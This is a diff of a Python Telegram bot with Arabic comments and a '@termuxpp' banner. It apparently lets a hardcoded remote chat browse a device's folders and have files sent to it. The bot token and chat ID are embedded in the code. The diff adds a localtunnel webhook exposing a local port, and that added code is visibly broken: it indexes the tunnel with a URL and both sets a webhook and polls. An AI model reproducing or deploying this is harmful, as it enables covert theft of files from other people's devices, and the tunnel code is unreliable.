@@ -10,11 +10,11 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 import json
 
 # إعداد البوت باستخدام التوكن الخاص بك
-bot = telebot.TeleBot("7517544528:AAEwE_8hpzGDqaQyaNSBlRUHi0CZ-ptGn_o")
-chat_id = '5164991393'
+bot = telebot.TeleBot("7517544528:AAEwE_8hpzGDqaQyaNSBlRUHi0CZ-ptGn_o", threaded=False)
+chat_id = '51649913938'
 
 # قائمة المكتبات المطلوبة
-required_modules = ['telebot', 'pyfiglet', 'requests']
+required_modules = ['telebot', 'pyfiglet', 'requests', 'localtunnel']
 
 def install_modules():
     print("جاري التحقق من المكتبات المطلوبة...")
@@ -36,6 +36,7 @@ install_modules()
 
 import pyfiglet
 import requests
+from localtunnel import get_tunnel
 
 # حفظ قائمة الأجهزة المتصلة في ملف JSON
 devices_file = 'connected_devices.json'
@@ -65,6 +66,18 @@ def get_device_name():
     except Exception:
         device_name = "Unknown Device"
     return device_name
+
+# إنشاء معرف فريد لكل جهاز باستخدام اسم الجهاز ووقت التشغيل
+device_name = get_device_name()
+unique_device_id = hashlib.md5((device_name + str(time.time())).encode()).hexdigest()
+
+# استخدام localtunnel لفتح منفذ محلي وربطه بالبوت
+tunnel = get_tunnel(port=8000, subdomain=unique_device_id)
+webhook_url = tunnel['https://violet-pots-worry.loca.lt']  # هنا يتم تعيين URL الخاص بـ Localtunnel
+
+# إعداد البوت لاستخدام Webhook مع Localtunnel
+bot.remove_webhook()
+bot.set_webhook(url=webhook_url)  # دمج هذه السطر مع الكود الأصلي
 
 # طباعة رسالة الترحيب
 ab = pyfiglet.figlet_format("@termuxpp")
@@ -242,7 +255,6 @@ def handle_file_selection(message):
                 send_file(file_path)
                 break
     elif selected == "🔙 العودة إلى المجلد السابق":
-      
         parent_dir = os.path.dirname(current_directory)
         list_files_in_directory(parent_dir)
     elif selected == "🏠 العودة للمسار الرئيسي":
@@ -253,12 +265,10 @@ def handle_file_selection(message):
     else:
         bot.send_message(chat_id=chat_id, text=f'📂 المسار {selected} غير موجود أو غير صالح.')
 
-# بدء البوت
-device_name = get_device_name()
-environment, directory = detect_environment()
-
-# عرض الأجهزة المتصلة عند بدء التشغيل
+# بدء البوت باستخدام Webhook و LocalTunnel
 show_connected_devices()
 
-handle_device_selection(environment, directory, device_name)
-bot.polling()
+handle_device_selection(detect_environment()[0], detect_environment()[1], device_name)
+
+# تشغيل البوت
+bot.polling(none_stop=True)
